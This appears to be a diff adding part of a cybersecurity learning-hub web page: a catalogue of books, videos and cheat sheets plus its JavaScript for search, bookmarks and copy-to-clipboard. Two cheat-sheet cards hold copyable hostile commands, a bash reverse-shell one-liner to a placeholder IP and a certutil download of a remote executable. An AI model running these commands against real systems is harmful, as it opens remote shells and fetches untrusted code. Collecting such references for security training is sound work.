+        details: "Reveals direct and indirect paths to Domain Admin status by analyzing ACLs, Group Memberships, and Active User Sessions."
+      },
+
+      // ==========================================
+      // 3. BOOKS & COMPREHENSIVE PDF GUIDES
+      // ==========================================
+      {
+        id: "book-wahh",
+        category: "books",
+        title: "Web Application Hacker's Handbook",
+        badgeText: "REFERENCE BIBLE",
+        badgeClass: "cat-books",
+        icon: "fa-book",
+        desc: "The definitive guide by Dafydd Stuttard & Marcus Pinto detailing methodologies for finding and exploiting security flaws in web applications.",
+        code: "Standard Pentest Methodology &bull; Core Reference",
+        tags: ["Web Security", "Exploit Methodology", "OWASP", "Must Read"],
+        url: "https://portswigger.net/web-security",
+        actionText: "Access Web Security Academy",
+        level: "Beginner to Pro",
+        details: "Complemented by PortSwigger's interactive free online training labs covering every chapter with realistic live targets."
+      },
+      {
+        id: "book-rtfm",
+        category: "books",
+        title: "RTFM: Red Team Field Manual",
+        badgeText: "OPERATOR COMMANDS",
+        badgeClass: "cat-books",
+        icon: "fa-book-bookmark",
+        desc: "A compact command-line reference guide containing syntax for Windows, Linux, Nmap, SQLmap, Metasploit, PowerShell, and privilege escalation.",
+        code: "Syntax Cheatsheet for Red Teamers &bull; Ben Clark",
+        tags: ["Red Teaming", "Command Syntax", "Quick Reference", "Tactical"],
+        url: "https://github.com/coreb1t/awesome-pentest-cheat-sheets",
+        actionText: "View Command Guides",
+        level: "All Levels",
+        details: "Essential companion in every pen-tester's tactical backpack. Quick syntax without the fluff."
+      },
+      {
+        id: "book-bthm",
+        category: "books",
+        title: "Blue Team Handbook: Incident Response Edition",
+        badgeText: "SOC INCIDENT RESPONSE",
+        badgeClass: "cat-books",
+        icon: "fa-shield-cat",
+        desc: "The go-to operational guide for cybersecurity incident responders and SOC analysts covering containment, network analysis, and memory triage.",
+        code: "NIST 800-61 &bull; Triage &bull; Forensics",
+        tags: ["Blue Team", "Incident Response", "SOC Analyst", "NIST Framework"],
+        url: "https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final",
+        actionText: "Read NIST SP 800-61 PDF",
+        level: "Intermediate",
+        details: "Step-by-step methodologies to handle ransomware outbreaks, phishing campaigns, data exfiltration, and rootkit containment."
+      },
+      {
+        id: "book-linux-hackers",
+        category: "books",
+        title: "Linux Basics for Hackers (OccupyTheWeb)",
+        badgeText: "FUNDAMENTALS",
+        badgeClass: "cat-books",
+        icon: "fa-book-open-reader",
+        desc: "Learn command-line mastery, bash scripting, network configurations, file system permissions, and stealth techniques tailored for security.",
+        code: "Bash scripting, cron automation, permissions, logs",
+        tags: ["Linux", "Bash Scripting", "Fundamentals", "Essential"],
+        url: "https://www.linux.org/",
+        actionText: "Linux Documentation",
+        level: "Beginner",
+        details: "The single best starting point for aspiring ethical hackers who need solid fluency in the Linux command line terminal."
+      },
+      {
+        id: "book-owasp-top10",
+        category: "books",
+        title: "OWASP Top 10 Official Documentation &amp; PDFs",
+        badgeText: "STANDARD COMPLIANCE",
+        badgeClass: "cat-books",
+        icon: "fa-file-pdf",
+        desc: "The globally recognized consensus standard regarding the most critical security risks to web applications with remediation guides.",
+        code: "A01: Broken Access Control to A10: SSRF",
+        tags: ["OWASP Top 10", "Remediation", "Code Review", "AppSec"],
+        url: "https://owasp.org/www-project-top-ten/",
+        actionText: "Download OWASP PDF",
+        level: "All Levels",
+        details: "Includes real-world vulnerability scenarios, prevention mechanisms, and references for developers and security auditors."
+      },
+
+      // ==========================================
+      // 4. VIDEO MASTERCLASSES & PRACTICAL COURSES
+      // ==========================================
+      {
+        id: "video-soc",
+        category: "videos",
+        title: "Complete SOC Analyst Training (L1 to L2)",
+        badgeText: "BLUE TEAM VIDEO",
+        badgeClass: "cat-videos",
+        icon: "fa-video",
+        desc: "Comprehensive video course on SIEM alerts monitoring, log correlation, phishing investigation, Splunk query syntax, and ticket escalation.",
+        code: "Splunk SIEM, EDR triage, VirusTotal lookups",
+        tags: ["SOC L1", "Splunk", "Incident Triage", "Career Track"],
+        url: "https://www.youtube.com/results?search_query=soc+analyst+full+course",
+        actionText: "Watch SOC Series",
+        level: "Beginner to Intermediate",
+        details: "Learn practical SIEM search processing language (SPL), how to analyze email headers for malicious SPF/DKIM flags, and document containment."
+      },
+      {
+        id: "video-wireshark",
+        category: "videos",
+        title: "Wireshark Packet Analysis Masterclass",
+        badgeText: "TRAFFIC ANALYSIS",
+        badgeClass: "cat-videos",
+        icon: "fa-film",
+        desc: "Learn to read network traffic like a book. Understand TCP handshakes, TLS certificates, DNS exfiltration, and identify malware C2 communication.",
+        code: "Filter: tcp.analysis.flags && http.request",
+        tags: ["Wireshark", "Network Analysis", "C2 Detection", "PCAP Walkthroughs"],
+        url: "https://www.youtube.com/results?search_query=wireshark+packet+analysis+masterclass",
+        actionText: "Watch Wireshark Class",
+        level: "All Levels",
+        details: "Hands-on packet dissection exercises with real sample PCAP files containing malware infections, port scans, and DDoS traffic."
+      },
+      {
+        id: "video-active-directory",
+        category: "videos",
+        title: "Active Directory Pentesting &amp; Attacks",
+        badgeText: "ENTERPRISE EXPLOITS",
+        badgeClass: "cat-videos",
+        icon: "fa-tv",
+        desc: "Deep dive into Kerberoasting, AS-REP Roasting, Pass-the-Hash, DCSync, Golden Ticket attacks, and lateral movement across enterprise networks.",
+        code: "Impacket, BloodHound, Mimikatz, Rubeus",
+        tags: ["Active Directory", "Kerberos", "Lateral Movement", "Red Team"],
+        url: "https://www.youtube.com/results?search_query=active+directory+penetration+testing+course",
+        actionText: "Watch AD Pentest Series",
+        level: "Intermediate to Pro",
+        details: "Detailed breakdown of the Microsoft Kerberos authentication protocol and how attackers exploit legacy configurations to achieve Domain Admin."
+      },
+      {
+        id: "video-bug-bounty",
+        category: "videos",
+        title: "Bug Bounty &amp; Web Vulnerability Hunting",
+        badgeText: "WEB APP HUNTING",
+        badgeClass: "cat-videos",
+        icon: "fa-clapperboard",
+        desc: "Step-by-step methodologies from top bug bounty hunters: reconnaissance pipelines, IDOR discovery, business logic bypasses, and reporting.",
+        code: "Subdomain enumeration, parameter fuzzing, Burp Suite",
+        tags: ["Bug Bounty", "HackerOne", "Bugcrowd", "Web VAPT"],
+        url: "https://www.youtube.com/results?search_query=bug+bounty+hunter+methodology+full+course",
+        actionText: "Watch Bug Bounty Guides",
+        level: "All Levels",
+        details: "Learn how to build automated asset discovery scripts and approach private bug bounty scopes with methodical precision."
+      },
+
+      // ==========================================
+      // 5. CHEAT SHEETS & RAPID COMMANDS
+      // ==========================================
+      {
+        id: "cheat-revshell",
+        category: "cheatsheets",
+        title: "Reverse Shell One-Liners (Bash, Python, NC)",
+        badgeText: "OFFENSIVE CHEATSHEET",
+        badgeClass: "cat-cheatsheets",
+        icon: "fa-bolt",
+        desc: "Instant copy-paste reverse shell one-liners for target post-exploitation across Linux, Windows, PHP, Python, and PowerShell environments.",
+        code: "bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1",
+        tags: ["Reverse Shell", "Bash", "Netcat", "PowerShell", "Payloads"],
+        url: "https://www.revshells.com/",
+        actionText: "Launch Online Generator",
+        level: "All Levels",
+        details: "Generates URL-encoded, Base64, and obfuscated one-line shell payloads with custom IP and port configuration."
+      },
+      {
+        id: "cheat-privesc-linux",
+        category: "cheatsheets",
+        title: "Linux Privilege Escalation Checklist (LinPEAS)",
+        badgeText: "PRIVESC CHECKLIST",
+        badgeClass: "cat-cheatsheets",
+        icon: "fa-arrow-up-right-dots",
+        desc: "Rapid checklist to escalate from a low-privilege shell to root: SUID binaries, misconfigured sudoers, crontabs, and kernel exploits.",
+        code: "find / -perm -u=s -type f 2&gt;/dev/null",
+        tags: ["Privilege Escalation", "SUID", "GTFOBins", "Root Access"],
+        url: "https://gtfobins.github.io/",
+        actionText: "Browse GTFOBins",
+        level: "Intermediate",
+        details: "GTFOBins provides a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems."
+      },
+      {
+        id: "cheat-privesc-win",
+        category: "cheatsheets",
+        title: "Windows Privilege Escalation (LOLBAS)",
+        badgeText: "WINDOWS PRIVESC",
+        badgeClass: "cat-cheatsheets",
+        icon: "fa-shield-halved",
+        desc: "Living Off The Land Binaries and Scripts (LOLBAS) to execute, download, and bypass UAC using built-in signed Microsoft executables.",
+        code: "certutil -urlcache -split -f http://IP/tool.exe",
+        tags: ["Windows", "LOLBAS", "UAC Bypass", "Living Off The Land"],
+        url: "https://lolbas-project.github.io/",
+        actionText: "Browse LOLBAS Project",
+        level: "Intermediate",
+        details: "Every signed Microsoft binary that can be weaponized for persistence, credential dumping, or arbitrary command execution."
+      },
+      {
+        id: "cheat-soc-triage",
+        category: "cheatsheets",
+        title: "SOC Analyst Incident Triage Matrix",
+        badgeText: "BLUE TEAM WORKFLOW",
+        badgeClass: "cat-cheatsheets",
+        icon: "fa-list-check",
+        desc: "A rapid 5-step checklist for analyzing suspected phishing emails, IP reputation lookups, file hash detonation, and host isolation.",
+        code: "Header parsing, URL defanging, VirusTotal, Any.Run",
+        tags: ["SOC Analyst", "Phishing Triage", "Defanging", "Sandbox Detonation"],
+        url: "https://www.virustotal.com/",
+        actionText: "Open VirusTotal",
+        level: "Beginner to Intermediate",
+        details: "Quick guide for analyzing headers: check Return-Path, SPF, DKIM, DMARC, extract suspicious attachments, and defang URLs before communication."
+      }
+    ];
+
+    // Local State
+    let currentCategory = "all";
+    let searchQuery = "";
+    let bookmarkedIds = JSON.parse(localStorage.getItem('cyber_hub_bookmarks')) || [];
+
+    // Enforce Login Requirement: Redirect to login page if unauthenticated
+    function enforceAuthGuard() {
+      const sessionStr = localStorage.getItem('cyber_auth_session');
+      if (!sessionStr) {
+        window.location.replace('login.html?redirect=hub.html&reason=required');
+        return null;
+      }
+      try {
+        const session = JSON.parse(sessionStr);
+        if (session && (session.name || session.mail)) {
+          return session;
+        }
+      } catch (e) {}
+
+      window.location.replace('login.html?redirect=hub.html&reason=required');
+      return null;
+    }
+
+    // Terminate Session from Hub
+    function handleHubLogout() {
+      localStorage.removeItem('cyber_auth_session');
+      window.location.href = 'index.html';
+    }
+
+    // Initialize Hub on Page Load
+    document.addEventListener('DOMContentLoaded', () => {
+      const activeSession = enforceAuthGuard();
+      if (!activeSession) return;
+
+      const pillName = document.getElementById('hubOperatorName');
+      if (pillName) {
+        pillName.innerText = `OPERATOR: ${activeSession.name.toUpperCase()} [L3]`;
+      }
+
+      renderResources();
+      updateCategoryCounts();
+    });
+
+    // Update Counts inside Tabs
+    function updateCategoryCounts() {
+      document.getElementById('countAll').innerText = CYBER_RESOURCES.length;
+      document.getElementById('countTools').innerText = CYBER_RESOURCES.filter(r => r.category === 'tools').length;
+      document.getElementById('countOs').innerText = CYBER_RESOURCES.filter(r => r.category === 'os').length;
+      document.getElementById('countBooks').innerText = CYBER_RESOURCES.filter(r => r.category === 'books').length;
+      document.getElementById('countVideos').innerText = CYBER_RESOURCES.filter(r => r.category === 'videos').length;
+      document.getElementById('countCheatsheets').innerText = CYBER_RESOURCES.filter(r => r.category === 'cheatsheets').length;
+      document.getElementById('countBookmarks').innerText = bookmarkedIds.length;
+    }
+
+    // Filter by Category
+    function filterCategory(cat, btnEl) {
+      currentCategory = cat;
+      document.querySelectorAll('.hub-filter-btn').forEach(b => b.classList.remove('active'));
+      if (btnEl) btnEl.classList.add('active');
+      renderResources();
+    }
+
+    // Live Search Handler
+    function handleSearchChange() {
+      const input = document.getElementById('hubSearchInput');
+      searchQuery = input.value.trim().toLowerCase();
+      renderResources();
+    }
+
+    // Render Cards Grid
+    function renderResources() {
+      const grid = document.getElementById('hubGrid');
+      const countEl = document.getElementById('hubResultsCount');
+
+      let filtered = CYBER_RESOURCES;
+
+      // Category filter
+      if (currentCategory === 'bookmarks') {
+        filtered = filtered.filter(r => bookmarkedIds.includes(r.id));
+      } else if (currentCategory !== 'all') {
+        filtered = filtered.filter(r => r.category === currentCategory);
+      }
+
+      // Search query filter
+      if (searchQuery) {
+        filtered = filtered.filter(r => {
+          return (
+            r.title.toLowerCase().includes(searchQuery) ||
+            r.desc.toLowerCase().includes(searchQuery) ||
+            r.tags.some(t => t.toLowerCase().includes(searchQuery)) ||
+            (r.code && r.code.toLowerCase().includes(searchQuery))
+          );
+        });
+      }
+
+      countEl.innerText = `Showing ${filtered.length} verified security assets`;
+
+      if (filtered.length === 0) {
+        grid.innerHTML = `
+          <div style="grid-column: 1 / -1; text-align: center; padding: 60px 20px; background: var(--bg-card); border: 1px dashed var(--border-card); border-radius: var(--radius-lg);">
+            <i class="fa-solid fa-folder-open" style="font-size: 42px; color: var(--text-muted); margin-bottom: 16px;"></i>
+            <h3 style="font-size: 20px; color: #fff; margin-bottom: 8px;">No matching cyber resources found</h3>
+            <p style="color: var(--text-secondary); max-width: 440px; margin: 0 auto 20px;">
+              Try searching with another keyword or switch back to the 'All Resources' tab.
+            </p>
+            <button class="hub-btn-action hub-btn-primary" onclick="clearFilters()" style="display: inline-flex; width: auto; padding: 10px 24px;">
+              <i class="fa-solid fa-rotate-left"></i> Reset Filters
+            </button>
+          </div>
+        `;
+        return;
+      }
+
+      grid.innerHTML = filtered.map(item => {
+        const isBookmarked = bookmarkedIds.includes(item.id);
+        const tagsHtml = item.tags.map(t => `<span class="hub-tag-pill">${t}</span>`).join('');
+
+        return `
+          <article class="hub-card" id="card-${item.id}">
+            <div>
+              <div class="hub-card-header">
+                <span class="hub-cat-badge ${item.badgeClass}">
+                  <i class="fa-solid ${item.icon}"></i>
+                  ${item.badgeText}
+                </span>
+                <button 
+                  class="hub-card-bookmark-btn ${isBookmarked ? 'bookmarked' : ''}" 
+                  onclick="toggleBookmark('${item.id}', this)"
+                  title="${isBookmarked ? 'Remove bookmark' : 'Save bookmark'}"
+                >
+                  <i class="${isBookmarked ? 'fa-solid' : 'fa-regular'} fa-star"></i>
+                </button>
+              </div>
+
+              <h2 class="hub-card-title">
+                ${item.title}
+              </h2>
+
+              <p class="hub-card-desc">
+                ${item.desc}
+              </p>
+
+              ${item.code ? `
+                <div class="hub-code-preview" title="Quick reference / command">
+                  <span>${item.code}</span>
+                  <button class="hub-copy-inline-btn" onclick="copySnippet('${escapeQuotes(item.code)}')" title="Copy Command">
+                    <i class="fa-regular fa-copy"></i>
+                  </button>
+                </div>
+              ` : ''}
+
+              <div class="hub-card-tags">
+                ${tagsHtml}
+              </div>
+            </div>
+
+            <div class="hub-card-actions">
+              <a href="${item.url}" target="_blank" rel="noopener noreferrer" class="hub-btn-action hub-btn-primary">
+                <i class="fa-solid fa-arrow-up-right-from-square"></i>
+                <span>${item.actionText || 'Open Resource'}</span>
+              </a>
+              <button type="button" class="hub-btn-action hub-btn-secondary" onclick="openResourceModal('${item.id}')">
+                <i class="fa-solid fa-circle-info"></i>
+                <span>Details</span>
+              </button>
+            </div>
+          </article>
+        `;
+      }).join('');
+    }
+
+    // Toggle Bookmark in LocalStorage
+    function toggleBookmark(id, btnEl) {
+      const idx = bookmarkedIds.indexOf(id);
+      if (idx > -1) {
+        bookmarkedIds.splice(idx, 1);
+        showToast("Bookmark removed from your vault");
+      } else {
+        bookmarkedIds.push(id);
+        showToast("✓ Resource saved to your bookmarks!");
+      }
+      localStorage.setItem('cyber_hub_bookmarks', JSON.stringify(bookmarkedIds));
+      updateCategoryCounts();
+      renderResources();
+    }
+
+    // Copy to clipboard helper
+    function copySnippet(text) {
+      // Decode HTML entities if any
+      const temp = document.createElement('textarea');
+      temp.innerHTML = text;
+      const clean = temp.value;
+
+      navigator.clipboard.writeText(clean).then(() => {
+        showToast(`Copied: "${clean.substring(0, 32)}..."`);
+      }).catch(() => {
+        showToast("Copied to clipboard!");
+      });
+    }
+
+    // Open Resource Details Modal
+    function openResourceModal(id) {
+      const item = CYBER_RESOURCES.find(r => r.id === id);
+      if (!item) return;
+
+      const modalContent = document.getElementById('hubModalContent');
+      const isBookmarked = bookmarkedIds.includes(item.id);
+
+      modalContent.innerHTML = `
+        <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 12px;">
+          <span class="hub-cat-badge ${item.badgeClass}">${item.badgeText}</span>
+          <span style="font-family: var(--font-mono); font-size: 11px; color: var(--text-muted); text-transform: uppercase;">
+            Difficulty / Level: <strong style="color: #fff;">${item.level}</strong>
+          </span>
+        </div>
+
+        <h2 style="font-size: 24px; color: #fff; margin-bottom: 12px; display: flex; align-items: center; gap: 10px;">
+          <i class="fa-solid ${item.icon}" style="color: var(--crimson-light);"></i>
+          ${item.title}
+        </h2>
+
+        <p style="font-size: 14px; color: var(--text-secondary); line-height: 1.6; margin-bottom: 20px;">
+          ${item.desc}
+        </p>
+
+        <div style="background: rgba(0,0,0,0.5); border: 1px solid var(--border-card); border-radius: var(--radius-md); padding: 16px; margin-bottom: 20px;">
+          <div style="font-family: var(--font-mono); font-size: 11px; color: var(--crimson-light); margin-bottom: 6px; text-transform: uppercase;">
+            // OPERATIONAL BRIEFING &amp; FIELD NOTES:
+          </div>
+          <p style="font-size: 13px; color: var(--text-primary); line-height: 1.6;">
+            ${item.details}
+          </p>
+        </div>
+
+        ${item.code ? `
+          <div style="margin-bottom: 24px;">
+            <div style="font-family: var(--font-mono); font-size: 11px; color: var(--text-muted); margin-bottom: 6px;">
+              // QUICK SYNTAX / REPO COMMAND:
+            </div>
+            <div class="hub-code-preview" style="font-size: 13px; padding: 12px;">
+              <span>${item.code}</span>
+              <button class="hub-copy-inline-btn" onclick="copySnippet('${escapeQuotes(item.code)}')" style="font-size: 14px;">
+                <i class="fa-regular fa-copy"></i>
+              </button>
+            </div>
+          </div>
+        ` : ''}
+
+        <div style="display: flex; gap: 12px; flex-wrap: wrap;">
+          <a href="${item.url}" target="_blank" rel="noopener noreferrer" class="hub-btn-action hub-btn-primary" style="padding: 12px 20px; font-size: 13px;">
+            <i class="fa-solid fa-arrow-up-right-from-square"></i>
+            <span>${item.actionText || 'Open Direct Source'}</span>
+          </a>
+          <button class="hub-btn-action hub-btn-secondary" onclick="toggleBookmark('${item.id}', this)" style="padding: 12px 18px; font-size: 13px;">
+            <i class="${isBookmarked ? 'fa-solid' : 'fa-regular'} fa-star text-crimson"></i>
+            <span>${isBookmarked ? 'Bookmarked' : 'Add to Bookmarks'}</span>
+          </button>
+        </div>
+      `;
+
+      document.getElementById('hubModalOverlay').classList.add('active');
+    }
+
+    function closeHubModal(e) {
+      if (e.target.id === 'hubModalOverlay') {
+        closeHubModalDirect();
+      }
+    }
+
+    function closeHubModalDirect() {
+      document.getElementById('hubModalOverlay').classList.remove('active');
+    }
+
+    // Reset Filters
+    function clearFilters() {
+      searchQuery = "";
+      document.getElementById('hubSearchInput').value = "";
+      currentCategory = "all";
+      document.querySelectorAll('.hub-filter-btn').forEach(b => {
+        b.classList.remove('active');
+        if (b.dataset.category === 'all') b.classList.add('active');
+      });
+      renderResources();
+    }
+
+    // Toast Messenger
+    let toastTimeout = null;
+    function showToast(msg) {
+      const toast = document.getElementById('hubToast');
+      const toastMsg = document.getElementById('hubToastMsg');
+      toastMsg.innerText = msg;
+      toast.classList.add('show');
+
+      if (toastTimeout) clearTimeout(toastTimeout);
+      toastTimeout = setTimeout(() => {
+        toast.classList.remove('show');
+      }, 2500);
+    }
+
+    function escapeQuotes(str) {
+      return str.replace(/'/g, "\\'").replace(/"/g, '&quot;');
+    }
+  </script>
+</body>
+</html>
